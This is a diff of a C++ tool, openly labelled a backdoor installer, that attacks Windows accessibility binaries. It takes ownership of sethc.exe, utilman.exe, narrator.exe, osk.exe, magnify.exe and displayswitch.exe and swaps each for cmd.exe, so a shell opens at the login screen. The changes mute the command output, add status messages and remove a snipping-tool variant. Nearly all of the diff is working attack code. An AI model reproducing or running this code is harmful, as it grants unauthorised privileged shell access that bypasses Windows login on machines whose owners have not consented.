@@ -6,38 +6,41 @@
 
 void error_handling(int status, const std::string& command) {
     if (status != 0) {
-        std::cout << "Error Running Command: " << command << std::endl;
+        std::cout << "\033[1;31mError Running Command: \033[0m" << command << std::endl;
+        exit(EXIT_FAILURE);
     }
 }
 
 void priv_esc() {
     //grants administrative permissions to sethc.exe (Sticky Keys)
-    error_handling(system("takeown /f C:\\Windows\\System32\\sethc.exe"), "takeown /f C:\\Windows\\System32\\sethc.exe");
-    error_handling(system("icacls C:\\Windows\\System32\\sethc.exe /grant administrators:F"), "icacls C:\\Windows\\System32\\sethc.exe /grant administrators:F");
+    error_handling(system("takeown /f C:\\Windows\\System32\\sethc.exe >nul 2>&1"), "takeown /f C:\\Windows\\System32\\sethc.exe");
+    error_handling(system("icacls C:\\Windows\\System32\\sethc.exe /grant administrators:F >nul 2>&1"), "icacls C:\\Windows\\System32\\sethc.exe /grant administrators:F");
+    std::cout << "\033[1;32m\tSuccessfully Granted Admin Privileges for Sticky Keys\033[0m" << std::endl;
 
     //grants administrative permissions to utilman.exe (Utility Manager)
-    error_handling(system("takeown /f C:\\Windows\\System32\\utilman.exe"), "takeown /f C:\\Windows\\System32\\utilman.exe");
-    error_handling(system("icacls C:\\Windows\\System32\\utilman.exe /grant administrators:F"), "icacls C:\\Windows\\System32\\utilman.exe /grant administrators:F");
+    error_handling(system("takeown /f C:\\Windows\\System32\\utilman.exe >nul 2>&1"), "takeown /f C:\\Windows\\System32\\utilman.exe");
+    error_handling(system("icacls C:\\Windows\\System32\\utilman.exe /grant administrators:F >nul 2>&1"), "icacls C:\\Windows\\System32\\utilman.exe /grant administrators:F");
+    std::cout << "\033[1;32m\tSuccessfully Granted Admin Privileges for Utility Manager\033[0m" << std::endl;
 
     //grants administrative permissions to narrator.exe (Narrator)
-    error_handling(system("takeown /f C:\\Windows\\System32\\narrator.exe"), "takeown /f C:\\Windows\\System32\\narrator.exe");
-    error_handling(system("icacls C:\\Windows\\System32\\narrator.exe /grant administrators:F"), "icacls C:\\Windows\\System32\\narrator.exe /grant administrators:F");
+    error_handling(system("takeown /f C:\\Windows\\System32\\narrator.exe >nul 2>&1"), "takeown /f C:\\Windows\\System32\\narrator.exe");
+    error_handling(system("icacls C:\\Windows\\System32\\narrator.exe /grant administrators:F >nul 2>&1"), "icacls C:\\Windows\\System32\\narrator.exe /grant administrators:F");
+    std::cout << "\033[1;32m\tSuccessfully Granted Admin Privileges for Narrator\033[0m" << std::endl;
 
     //grants administrative permissions to osk.exe (On Screen Keyboard)
-    error_handling(system("takeown /f C:\\Windows\\System32\\osk.exe"), "takeown /f C:\\Windows\\System32\\osk.exe");
-    error_handling(system("icacls C:\\Windows\\System32\\osk.exe /grant administrators:F"), "icacls C:\\Windows\\System32\\osk.exe /grant administrators:F");
+    error_handling(system("takeown /f C:\\Windows\\System32\\osk.exe >nul 2>&1"), "takeown /f C:\\Windows\\System32\\osk.exe");
+    error_handling(system("icacls C:\\Windows\\System32\\osk.exe /grant administrators:F >nul 2>&1"), "icacls C:\\Windows\\System32\\osk.exe /grant administrators:F");
+    std::cout << "\033[1;32m\tSuccessfully Granted Admin Privileges for On Screen Keyboard\033[0m" << std::endl;
 
     //grants administrative permissions to sethc.exe (Magnifier)
-    error_handling(system("takeown /f C:\\Windows\\System32\\magnify.exe"), "takeown /f C:\\Windows\\System32\\magnify.exe");
-    error_handling(system("icacls C:\\Windows\\System32\\magnify.exe /grant administrators:F"), "icacls C:\\Windows\\System32\\magnify.exe /grant administrators:F");
+    error_handling(system("takeown /f C:\\Windows\\System32\\magnify.exe >nul 2>&1"), "takeown /f C:\\Windows\\System32\\magnify.exe");
+    error_handling(system("icacls C:\\Windows\\System32\\magnify.exe /grant administrators:F >nul 2>&1"), "icacls C:\\Windows\\System32\\magnify.exe /grant administrators:F");
+    std::cout << "\033[1;32m\tSuccessfully Granted Admin Privileges for Magnifier\033[0m" << std::endl;
 
     //grants administrative permissions to displayswitch.exe (Display)
-    error_handling(system("takeown /f C:\\Windows\\System32\\displayswitch.exe"), "takeown /f C:\\Windows\\System32\\displayswitch.exe");
-    error_handling(system("icacls C:\\Windows\\System32\\displayswitch.exe /grant administrators:F"), "icacls C:\\Windows\\System32\\displayswitch.exe /grant administrators:F");
-
-    //grants administrative permissions to snippingtool.exe (Snipping Tool)
-    error_handling(system("takeown /f C:\\Windows\\System32\\snippingtool.exe"), "takeown /f C:\\Windows\\System32\\snippingtool.exe");
-    error_handling(system("icacls C:\\Windows\\System32\\snippingtool.exe /grant administrators:F"), "icacls C:\\Windows\\System32\\snippingtool.exe /grant administrators:F");
+    error_handling(system("takeown /f C:\\Windows\\System32\\displayswitch.exe >nul 2>&1"), "takeown /f C:\\Windows\\System32\\displayswitch.exe");
+    error_handling(system("icacls C:\\Windows\\System32\\displayswitch.exe /grant administrators:F >nul 2>&1"), "icacls C:\\Windows\\System32\\displayswitch.exe /grant administrators:F");
+    std::cout << "\033[1;32m\tSuccessfully Granted Admin Privileges for Display\033[0m" << std::endl;
 }
 
 void cleanup() {
@@ -65,67 +68,66 @@ void cleanup() {
         //restores original executables
         std::string renameCommand = "move \"" + executable + "\" \"" + original + "\"";
         //std::cout << renameCommand << std::endl; testing
-        error_handling(system(renameCommand.c_str()), renameCommand.c_str());
+        error_handling(system((renameCommand + " > nul 2>&1").c_str()), renameCommand.c_str());
+        std::cout << "\033[1;32m\tRemoved Previous Backdoor\033[0m" << std::endl;
     }
 }
 
 void sticky_keys() {
     //makes sure that sticky keys is turned on
-    error_handling(system("reg add \"HKEY_CURRENT_USER\\Control Panel\\Accessibility\\StickyKeys\" /v \"Flags\" /t REG_SZ /d \"507\" /f"), 
+    error_handling(system("reg add \"HKEY_CURRENT_USER\\Control Panel\\Accessibility\\StickyKeys\" /v \"Flags\" /t REG_SZ /d \"507\" /f >nul 2>&1"), 
     "reg add \"HKEY_CURRENT_USER\\Control Panel\\Accessibility\\StickyKeys\" /v \"Flags\" /t REG_SZ /d \"507\" /f");
     
     //replaces sethc.exe with cmd.exe
-    error_handling(system("rename C:\\Windows\\System32\\sethc.exe old-sethc.exe"), "rename C:\\Windows\\System32\\sethc.exe old-sethc.exe");
-    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe");
+    error_handling(system("rename C:\\Windows\\System32\\sethc.exe old-sethc.exe >nul 2>&1"), "rename C:\\Windows\\System32\\sethc.exe old-sethc.exe");
+    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe >nul 2>&1"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe");
 }
 
 void utility_manager() {
     //replaces utilman.exe with cmd.exe
-    error_handling(system("rename C:\\Windows\\System32\\utilman.exe old-utilman.exe"), "rename C:\\Windows\\System32\\utilman.exe old-utilman.exe");
-    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe");
+    error_handling(system("rename C:\\Windows\\System32\\utilman.exe old-utilman.exe >nul 2>&1"), "rename C:\\Windows\\System32\\utilman.exe old-utilman.exe");
+    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe >nul 2>&1"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\utilman.exe");
 }
 
 void narrator() {
     //replaces narrator.exe with cmd.exe
-    error_handling(system("rename C:\\Windows\\System32\\narrator.exe old-narrator.exe"), "rename C:\\Windows\\System32\\narrator.exe old-narrator.exe");
-    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\narrator.exe"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\narrator.exe");
+    error_handling(system("rename C:\\Windows\\System32\\narrator.exe old-narrator.exe >nul 2>&1"), "rename C:\\Windows\\System32\\narrator.exe old-narrator.exe");
+    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\narrator.exe >nul 2>&1"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\narrator.exe");
 }
 
 void on_screen_keyboard() {
     //replaces osk.exe with cmd.exe
-    error_handling(system("rename C:\\Windows\\System32\\osk.exe old-osk.exe"), "rename C:\\Windows\\System32\\osk.exe old-osk.exe");
-    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\osk.exe"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\osk.exe");
+    error_handling(system("rename C:\\Windows\\System32\\osk.exe old-osk.exe >nul 2>&1"), "rename C:\\Windows\\System32\\osk.exe old-osk.exe");
+    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\osk.exe >nul 2>&1"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\osk.exe");
 }
 
 void magnifier() {
     //replaces magnify.exe with cmd.exe
-    error_handling(system("rename C:\\Windows\\System32\\magnify.exe old-magnify.exe"), "rename C:\\Windows\\System32\\magnify.exe old-magnify.exe");
-    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\magnify.exe"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\magnify.exe");
+    error_handling(system("rename C:\\Windows\\System32\\magnify.exe old-magnify.exe >nul 2>&1"), "rename C:\\Windows\\System32\\magnify.exe old-magnify.exe");
+    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\magnify.exe >nul 2>&1"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\magnify.exe");
 }
 
 void display_switch() {
     //replaces displayswitch.exe with cmd.exe
-    error_handling(system("rename C:\\Windows\\System32\\displayswitch.exe old-displayswitch.exe"), "rename C:\\Windows\\System32\\displayswitch.exe old-displayswitch.exe");
-    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\displayswitch.exe"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\displayswitch.exe");
-}
-
-void snipping_tool() {
-    //replaces snippingtool.exe with cmd.exe
-    error_handling(system("rename C:\\Windows\\System32\\snippingtool.exe old-snippingtool.exe"), "rename C:\\Windows\\System32\\snippingtool.exe old-snippingtool.exe");
-    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\snippingtool.exe"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\snippingtool.exe");
+    error_handling(system("rename C:\\Windows\\System32\\displayswitch.exe old-displayswitch.exe >nul 2>&1"), "rename C:\\Windows\\System32\\displayswitch.exe old-displayswitch.exe");
+    error_handling(system("copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\displayswitch.exe >nul 2>&1"), "copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\displayswitch.exe");
 }
 
 int main(int argc, char *argv[]){
+    //clears terminal
+    error_handling(system("cls"), "cls");
+
     //grants administrator permissions to all backdoor executables
     std::cout << "Gaining Permissions..." << std::endl;
     priv_esc();
 
     //enables all windows hotkeys on the error_handling(system
-    error_handling(system("reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v \"DisabledHotkeys\" /t REG_BINARY /d \"\" /f"), 
+    error_handling(system("reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v \"DisabledHotkeys\" /t REG_BINARY /d \"\" /f >nul 2>&1"), 
     "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" /v \"DisabledHotkeys\" /t REG_BINARY /d \"\" /f");
+    std::cout << "\033[1;32m\tSuccessfully Enabled All Windows Hotkeys\033[0m" << std::endl;
 
     //cleans up previous runs beforehand
-    std::cout << "Cleaning Up..." << std::endl;
+    std::cout << "Cleaning Up Previous Backdoors..." << std::endl;
     cleanup();
 
     //executes selected backdoors
@@ -137,34 +139,30 @@ int main(int argc, char *argv[]){
         on_screen_keyboard();
         magnifier();
         display_switch();
-        snipping_tool();
     }
     else {
         for (int i = 1; i < argc; i++) {
             const std::string arg = argv[i];
             if (arg == "sk") {
                 sticky_keys();
-                std::cout << "Executed Sticky Keys Backdoor" << std::endl;
+                std::cout << "\033[1;32m\tExecuted Sticky Keys Backdoor\033[0m" << std::endl;
             } else if (arg == "um") {
                 utility_manager();
-                std::cout << "Executed Utility Manager Backdoor" << std::endl;
+                std::cout << "\033[1;32m\tExecuted Utility Manager Backdoor\033[0m" << std::endl;
             } else if (arg == "n") {
                 narrator();
-                std::cout << "Executed Narrator Backdoor" << std::endl;
+                std::cout << "\033[1;32m\tExecuted Narrator Backdoor\033[0m" << std::endl;
             } else if (arg == "osk") {
                 on_screen_keyboard();
-                std::cout << "Executed On Screen Keyboard Backdoor" << std::endl;
+                std::cout << "\033[1;32m\tExecuted On Screen Keyboard Backdoor\033[0m" << std::endl;
             } else if (arg == "m") {
                 magnifier();
-                std::cout << "Executed Magnifier Backdoor" << std::endl;
+                std::cout << "\033[1;32m\tExecuted Magnifier Backdoor\033[0m" << std::endl;
             } else if (arg == "ds") {
                 display_switch();
-                std::cout << "Executed Display Switch Backdoor" << std::endl;
-            } else if (arg == "st") {
-                snipping_tool();
-                std::cout << "Executed Snipping Tool Backdoor" << std::endl;
+                std::cout << "\033[1;32m\tExecuted Display Switch Backdoor\033[0m" << std::endl;
             } else {
-                std::cout << "Invalid Argument: " << arg << std::endl;
+                std::cout << "\033[1;31m\tInvalid Argument: \033[0m" << arg << std::endl;
             }
         }
     }
